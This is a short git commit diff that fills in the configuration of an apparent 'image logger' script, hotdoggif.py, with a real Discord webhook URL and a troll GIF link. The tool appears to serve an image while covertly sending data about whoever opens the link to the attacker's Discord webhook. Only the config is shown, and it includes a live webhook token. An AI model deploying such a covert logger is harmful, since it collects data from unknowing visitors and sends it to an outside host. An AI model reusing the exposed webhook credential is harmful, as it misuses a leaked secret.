5cad5cf99120d08a7759dadbd75760e8f5b0df5a
ElevationDev1 <128258141+ElevationDev1@users.noreply.github.com>
2023-04-15 17:28:45 +0200

    Update hotdoggif.py

--- api/hotdoggif.py
+++ api/hotdoggif.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1096819125566840974/w142oM8zUWQHV2-7p9dTXqh2cY5Zm2YtTZglMrLw9J1GVfpOPpeFbZfhzf7WJFlH9GwN",
+    "image": "https://media.tenor.com/_bTaLmoLSc4AAAAd/troll-pilled.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
